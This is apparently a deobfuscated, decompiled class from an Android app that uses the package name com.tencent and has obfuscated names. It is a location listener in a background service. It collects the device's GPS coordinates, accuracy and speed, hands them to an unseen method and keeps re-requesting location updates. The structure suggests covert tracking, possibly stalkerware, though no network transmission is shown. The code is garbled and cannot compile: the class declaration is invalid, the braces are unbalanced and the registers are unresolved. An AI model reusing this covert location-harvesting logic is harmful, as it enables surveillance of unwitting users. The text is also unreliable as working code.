package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: TertiaryBackgroundService_1
 * Original: Lcom/tencent/tunesxconcerningn105$1;
 */
class TertiaryBackgroundService_1 implements LocationListener; {

    // === FIELDS ===
    final TertiaryBackgroundService this$0;

    // === METHODS ===

     void Constructor(TertiaryBackgroundService param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void onLocationChanged(Location param0) {
        if (v7 == null || v7 == 0) { // goto +97
        v7.getLongitude();
        TertiaryBackgroundService.Longting = v0;
        v7.getLatitude();
        TertiaryBackgroundService.ʾʼʾʿˈᵔঙʿ$ʿʼ = v0;
        v0 = v7.getAccuracy();
        TertiaryBackgroundService.letliudid = v0;
        v7 = v7.getSpeed();
        TertiaryBackgroundService.sp = v7;
        v0 = v6.this$0;
        v1 = TertiaryBackgroundService.ʾʼʾʿˈᵔঙʿ$ʿʼ;
        v3 = TertiaryBackgroundService.Longting;
        v5 = TertiaryBackgroundService.letliudid;
        TertiaryBackgroundService.access$000(...);
        v7 = TertiaryBackgroundService.LM;
        v0 = "gps";
        v7 = v7.isProviderEnabled("gps");
        if (v7 == null || v7 == 0) { // goto +52
        v7 = TertiaryBackgroundService.LM;
        v7.removeUpdates("gps");
        v7 = v6.this$0;
        v7.getApplicationContext();
        v7 = ActivityCompat.checkSelfPermission(v7, "android.permission.ACCESS_FINE_LOCATION");
        if (v7 == null || v7 == 0) { // goto +17
        v7 = v6.this$0;
        v7.getApplicationContext();
        v1 = ActivityCompat.checkSelfPermission(v7, "android.permission.ACCESS_COARSE_LOCATION");
        if (v7 == null || v7 == 0) { // goto +3
        return;
        v1 = "gps";
        v2 = TertiaryBackgroundService.t;
        v4 = TertiaryBackgroundService.d;
        v4 = (float) v4;
        v5 = TertiaryBackgroundService.LL;
        LocationManager.requestLocationUpdates(...);
        return;
    }

    public void onProviderDisabled(String param0) {
        return;
    }

    public void onProviderEnabled(String param0) {
        return;
    }

    public void onStatusChanged(String param0, int param1, Bundle param2) {
        return;
    }
}
